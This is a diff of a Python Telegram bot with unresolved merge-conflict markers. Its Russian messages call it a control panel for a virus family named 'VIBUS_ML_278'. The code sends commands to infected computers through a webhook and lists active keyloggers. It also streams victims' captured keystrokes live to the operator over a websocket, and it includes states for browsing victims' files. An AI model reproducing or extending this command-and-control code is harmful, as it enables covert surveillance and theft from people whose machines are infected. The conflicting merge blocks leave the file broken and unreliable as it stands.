@@ -8,7 +8,10 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder, InlineKeyboardButton
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 import websockets
+<<<<<<< HEAD
 import json
+=======
+>>>>>>> a6a076d2c779859ce9b613cfd473fd662a56b957
 
 
 def keyboard_builder(width, *args):
@@ -26,12 +29,16 @@ class KeyloggerStates(StatesGroup):
     start_listening = State()
 
 
+<<<<<<< HEAD
 class FileManagerStates(StatesGroup):
     start_files = State()
     navigate = State()
 
 
 async def main():
+=======
+async def main() :
+>>>>>>> a6a076d2c779859ce9b613cfd473fd662a56b957
     await dp.start_polling(bot)
 
 WEBHOOK_URL = 'http://192.168.0.108:8000/send-command'
@@ -53,6 +60,7 @@ async def send_post_request(data: dict):
 
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
+<<<<<<< HEAD
     await message.answer(
         'Приветствую! Ты в боте для управления вирусами "VIBUS_ML_278"! '
         'Ты можешь управлять зараженными компьютерами и их файлами!'
@@ -166,6 +174,42 @@ async def handle_file_actions(callback: CallbackQuery, state: FSMContext):
     else:
         await callback.message.answer(f"❌ Не удалось отправить команду '{action}'. Проверьте соединение.")
 
+
+=======
+    await message.answer('Приветствую тебя в боте для управления самого мощного семейство вирусов "VIBUS_ML_278" ! Ну а раз ты уже здесь то ты достоин !!!')
+    keyboard = keyboard_builder(4, "Зараженные компьютеры", "Инструкция", "Слова авторов", "Прослушка")
+    await message.answer(text="что делаем ?", reply_markup=keyboard)
+>>>>>>> a6a076d2c779859ce9b613cfd473fd662a56b957
+
+
+@dp.callback_query(lambda call: call.data == "Прослушка")
+async def get_keyloggers(callback: CallbackQuery, state: FSMContext):
+    url = "http://127.0.0.1:8000/check_keyloggers"
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url) as response:
+            data = await response.json()
+            total = data["total"]
+    if total:
+        await callback.message.answer(text=f"Всего доступно {total} кейлоггеров \n"
+                                           f" Выбери тот, к которому хочешь подключиться"
+                                           f"Введи число от 1 до {total}")
+        await state.set_state(KeyloggerStates.start_listening)
+    else:
+        await callback.message.answer("В данный момент нет доступных кейлоггеров(")
+
+
+async def consumer_handler(websocket, message: Message):
+    async for word in websocket:
+        await message.answer(text=word)
+
+
+@dp.message(lambda mes: mes.text.isdigit(), StateFilter(KeyloggerStates.start_listening))
+async def connect_keylogger(message: Message):
+    user_choice = int(message.text)
+    url = f'ws://localhost:8000/ws/listen/{user_choice}'
+
+    async with websockets.connect(url) as websocket:
+        await consumer_handler(websocket, message)
 
 
 if __name__ == '__main__':
